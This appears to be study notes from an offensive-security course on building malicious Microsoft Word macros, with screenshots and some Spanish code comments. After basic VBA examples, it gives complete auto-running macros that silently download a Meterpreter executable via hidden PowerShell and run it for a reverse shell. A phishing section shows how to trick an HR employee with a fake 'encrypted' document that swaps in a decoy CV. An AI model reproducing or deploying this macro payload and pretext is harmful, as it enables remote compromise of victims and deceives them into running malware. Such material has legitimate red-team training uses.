<img width="1189" height="194" alt="image" src="https://github.com/user-attachments/assets/452dd7db-f606-45d8-a5f9-554588611c39" />

choose same doc
<img width="451" height="366" alt="image" src="https://github.com/user-attachments/assets/5592eeeb-31da-42df-818e-28d90aba5453" />

enter macro's name and Create
<img width="1003" height="583" alt="image" src="https://github.com/user-attachments/assets/d4c6c61f-eb4a-4aec-8162-6db367b3dde5" />

Variables before use, the name of the variable and its datatype.dtype
- Dim myString As String
- Dim myLong As Long
- Dim myPointer As LongPtr

In the example below, we'll have our macro check the value of a variable and based on the result, display the appropriate built-in MsgBoxmsgbox function.
```
Sub MyMacro()

Dim myLong As Long

myLong = 1

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```

To execute the macro we either click the "Run Macro" button or press %.

<img width="520" height="54" alt="image" src="https://github.com/user-attachments/assets/5557c13b-f7de-4ecd-a153-ab1689bd5695" />


This macro will display a "True" message box since the myLong variable is less than five.

Next, we'll explore the For loop, which increments a counter through the Next keyword. This is illustrated below in Listing 19.
```
Sub MyMacro()

For counter = 1 To 3
    MsgBox ("Alert")
Next counter

End Sub
```

or

<img width="1397" height="764" alt="image" src="https://github.com/user-attachments/assets/0a9b2bae-d46f-4041-aeb9-838e7467c614" />

and we got

<img width="1397" height="764" alt="image" src="https://github.com/user-attachments/assets/b704abd1-6626-470d-9898-6d0c5f47adab" />


Disabled macros notifications

<img width="1843" height="759" alt="image" src="https://github.com/user-attachments/assets/c02f62e7-5b01-4f6d-98cf-91edb6bca368" />

<img width="1843" height="759" alt="image" src="https://github.com/user-attachments/assets/ed050f3f-a98d-482a-9017-46fada3fc006" />


for Windows script host for a shell
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```


### Let PowerShell Help Us

PowerShell code to download Meterpreter executable
```
$url = "http://192.168.119.120/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)

```

Let's start writing our VBA code. 
```
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

Getting file path from ActiveDocument.Path
```
Dim exePath As String
exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
```

Complete VBA Macro
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    ' 1. Declarar TODAS las variables al inicio (Esto soluciona tu error)
    Dim str As String
    Dim exePath As String
    
    ' 2. Definir la ruta absoluta donde está el documento
    exePath = ActiveDocument.Path & "\msfstaged.exe"
    
    ' 3. Construir el comando de PowerShell usando la ruta absoluta (exePath)
    str = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.2:8000/msfstaged.exe', '" & exePath & "')"""
    
    ' 4. Ejecutar la descarga en segundo plano
    Shell str, vbHide
    
    ' 5. Esperar 5 segundos (suficiente para red local)
    Wait (5)
    
    ' 6. Verificar si el archivo existe antes de ejecutarlo
    If Dir(exePath) <> "" Then
        Shell exePath, vbHide
    Else
        MsgBox "Error: El archivo no se encontró en: " & exePath & vbCrLf & "Revisa si Windows Defender lo bloqueó.", vbCritical
    End If
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
Let's review what we did. We built a Word document that pulls the Meterpreter executable from our web server when the document is opened (and macros are enabled). We added a small time delay to allow the file to completely download. We then executed the file hidden from the user. This results in a reverse Meterpreter shell.



### Phishing PreTexting
A phishing attack exploits a victim's behavior, leveraging their curiosity or fear to encourage them to launch our payload despite their better judgement. Popular mechanisms include job applications, healthcare contract updates, invoices or human resources requests, depending on the target organization and specific employees.

When using Microsoft Office in a phishing attack, an attacker will typically present a document, state that the document is encrypted or protected, and suggest that the user must Enable Editing and Enable Content to properly view the document.

This technique is used in the popular Quasar RAT[19] and Ursnif Trojanpretext2 among others.

<img width="949" height="449" alt="image" src="https://github.com/user-attachments/assets/c270a757-fab5-4f09-9431-eb10f93f4817" />
In this particular example, our victim works in human resources and the target organization has posted an opening for a human resource analyst. Because of this, we'll keep our document centered on this pretext.

The bottom line is that we must keep up appearances to avoid alerting the victim.

When the victim enables our content, they will expect to see our "decrypted" content, in this case a resume. We also hope that the victim will keep the document open long enough for our reverse shell to connect. The best way to do this, and continue the deception, is to present relevant and expected content.

To begin the development of our "decrypted" content, we'll create a copy of this Word document, and delete the existing text content. Next, we'll insert "decrypted" content, which will display when the user enables macros. This content will include the simple fake CV shown in Figure 17.    

<img width="969" height="663" alt="image" src="https://github.com/user-attachments/assets/484acb59-33e6-4cfd-a303-49506a446008" />

With the text created, we'll mark it and navigate to Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery:

<img width="1317" height="415" alt="image" src="https://github.com/user-attachments/assets/99041684-2b4b-47eb-9045-b17e907620e1" />

In the Create New Building Block dialog box, we'll enter the name "TheDoc":

<img width="322" height="249" alt="image" src="https://github.com/user-attachments/assets/c7185ba1-5409-41c3-bd18-e252a393730c" />

With the content stored, we can delete it from the main text area of the document. Next, we'll copy the fake RSA encrypted text from the original Word document and insert it into the main text area of this document.

Now we'll need to edit the VBA macro, inserting commands that will delete the fake RSA encrypted text and replace it with the fake CV from the AutoText entry. Luckily, this is pretty simple.

The first step is to delete the fake RSA encrypted text through the ActiveDocument.Content[20] property (which returns a Rangerange object). Then we'll invoke the Selectrselect method to select the entire range of the ActiveDocument:

`ActiveDocument.Content.Select`
 Select the entire range of the ActiveDocument

With the content of the ActiveDocument selected, we can call Selection.Deletedelete to delete it.

`Selection.Delete`
Delete text of current Word document from VBA

Now that the text is deleted, we can insert the fake CV. We'll reference the AutoText entries from the AttachedTemplateatemp of the ActiveDocument. This gives us access to all of the AutoTextEntriestextent where we can choose our inserted text named "TheDoc".

To insert the text into the document, we'll invoke the Insertinsert function to insert the text in the document. Insert takes two arguments. The first sets the location of the insert and the second sets the formatting in the inserted text, which we will leave as the default RichText. We can combine this into a VBA one-liner (which displays in the listing below as two lines):

`ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True`
Insert text from AutoText gallery

Now that we have reviewed all the components of this macro, let's put everything together. To review, we use Document_Open and AutoOpen to guarantee that the macro will run when the document is opened and the user enables macros. When the macro runs, the SubstitutePage procedure selects all the text on the page, deletes it, and inserts our fake CV. The goal of this is to trick the victim into believing that they have decrypted our document.

We are now able to put together the final macro that performs text replacement ("decryption"):
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    ' --- PARTE 1: REEMPLAZAR EL CONTENIDO FALSO POR EL CURRÍCULUM ---
    On Error Resume Next ' Evita que se cierre si hay un error con el AutoText
    ActiveDocument.Content.Select
    Selection.Delete
    ' Nota: Usamos NormalTemplate porque guardamos el AutoText en la plantilla global
    NormalTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
    On Error GoTo 0

    ' --- PARTE 2: DESCARGAR Y EJECUTAR EL PAYLOAD ---
    Dim str As String
    Dim exePath As String
    
    ' Definir la ruta absoluta donde está el documento (o en %TEMP%)
    exePath = ActiveDocument.Path & "\msfstaged.exe"
    
    ' Construir el comando de PowerShell
    str = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.2:8000/msfstaged.exe', '" & exePath & "')"""
    
    ' Ejecutar la descarga en segundo plano
    Shell str, vbHide
    
    ' Esperar 5 segundos
    Wait (5)
    
    ' Verificar si el archivo existe antes de ejecutarlo
    If Dir(exePath) <> "" Then
        Shell exePath, vbHide
    Else
        MsgBox "Error: El archivo no se encontró en: " & exePath & vbCrLf & "Revisa si Windows Defender lo bloqueó.", vbCritical
    End If
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
Full macro to replace visible content



So, step by step after creating and saving RSA document

1- Open RSA Word 

2- Paste the "Personal Summary" text (the one provided previously) and format it professionally (Arial, justified, bold headings).

3- Select all the text.

4- Go to Insert > Quick Parts > AutoText > Save Selection to AutoText Gallery.

5- Name it exactly TheDoc and save it.

6- Close that document without saving. (The AutoText is now stored in Word's memory).

7 - open RSA word and create macros.






